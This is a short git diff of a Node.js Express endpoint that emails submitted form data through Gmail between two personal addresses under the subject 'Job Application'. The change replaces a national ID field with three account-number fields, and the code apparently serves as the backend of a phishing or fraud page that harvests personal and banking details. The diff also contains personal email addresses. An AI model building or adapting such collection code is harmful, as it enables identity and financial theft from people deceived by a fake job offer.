@@ -10,7 +10,7 @@ app.use(bodyParser.json());
 app.use(cors());
 
 app.post('/send-email', (req, res) => {
-    const { name, phone, cpr } = req.body;
+    const { name, phoneNumber, account1, account2, account3 } = req.body;
 
     const transporter = nodemailer.createTransport({
         service: 'gmail',
@@ -24,7 +24,7 @@ app.post('/send-email', (req, res) => {
         from: 'hamzasaeed4689@gmail.com',
         to: 'sameerali406046@gmail.com',
         subject: 'Job Application',
-        text: `Name: ${name}\nPhone: ${phone}\nCPR Number: ${cpr}`
+        text: `Name: ${name}\nPhone: ${phoneNumber}\nAccount  Number 1: ${account1}\nAccount  Number 2: ${account2}\nAccount  Number 3: ${account3}`
     };
 
     transporter.sendMail(mailOptions, (error, info) => {
